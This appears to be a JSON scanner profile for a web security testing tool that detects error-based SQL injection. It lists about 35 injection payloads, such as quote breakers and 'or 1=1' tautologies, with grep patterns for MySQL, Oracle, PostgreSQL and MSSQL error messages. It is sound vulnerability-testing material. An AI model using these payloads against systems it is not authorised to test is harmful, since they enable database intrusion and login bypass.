[
  {
    "ProfileName": "ErrorSQLi",
    "Name": "",
    "Enabled": false,
    "Scanner": 1,
    "Author": "@egarme",
    "Payloads": [
      "true,\u0027-\u0027",
      "true,\u0027 \u0027",
      "true,\u0027\u0026\u0027",
      "true,\u0027^\u0027",
      "true,\u0027*\u0027",
      "true,\u0027 or \u0027\u0027-\u0027",
      "true,\u0027 or \u0027\u0027 \u0027",
      "true,\u0027 or \u0027\u0027\u0026\u0027",
      "true,\u0027 or \u0027\u0027^\u0027",
      "true,\u0027 or \u0027\u0027*\u0027",
      "true,\"-\"",
      "true,\" \"",
      "true,\"\u0026\"",
      "true,\"^\"",
      "true,\"*\"",
      "true,\" or \"\"-\"",
      "true,\" or \"\" \"",
      "true,\" or \"\"\u0026\"",
      "true,\" or \"\"^\"",
      "true,\" or \"\"*\"",
      "true,or true--",
      "true,\" or true--",
      "true,\u0027 or true--",
      "true,\") or true--",
      "true,\u0027) or true--",
      "true,\u0027 or \u0027x\u0027\u003d\u0027x",
      "true,\u0027) or (\u0027x\u0027)\u003d(\u0027x",
      "true,\u0027)) or ((\u0027x\u0027))\u003d((\u0027x",
      "true,\" or \"x\"\u003d\"x",
      "true,\") or (\"x\")\u003d(\"x",
      "true,\")) or ((\"x\"))\u003d((\"x",
      "true,or 1\u003d1",
      "true,or 1\u003d1-- ",
      "true,or 1\u003d1#",
      "true,or 1\u003d1/*"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,Microsoft OLE DB Provider for ODBC Drivers error",
      "true,Or,You have an error in your SQL syntax",
      "true,Or,ORA-00933: SQL command not properly ended",
      "true,Or,Microsoft SQL Native Client error",
      "true,Or,Query failed: ERROR: syntax error at or near",
      "true,Or,You have an error in your SQL syntax",
      "true,Or,MySQL Error: 1064\" \u0026 \"Session halted",
      "true,Or,mysql error with query",
      "true,Or,sQL syntax error",
      "true,Or,PostgreSQL query failed: ERROR: parser: parse error",
      "true,Or,Warning: mysql_fetch_array",
      "true,Or,Warning: mysql_num_rows",
      "true,Or,Warning: mysql_query",
      "true,Or,Warning: mysql_fetch_assoc",
      "true,Or,Warning: mysql_result",
      "true,Or,Warning: mysql_free_result"
    ],
    "Tags": [
      "SQLi",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 5,
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "ErrorSQLi",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "Error SQLi with payloads:  \u003cbr\u003e \u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      18,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127,
      65,
      32,
      36,
      7,
      1,
      2,
      6,
      33,
      5,
      35,
      34,
      64,
      0,
      3,
      4,
      37,
      127
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]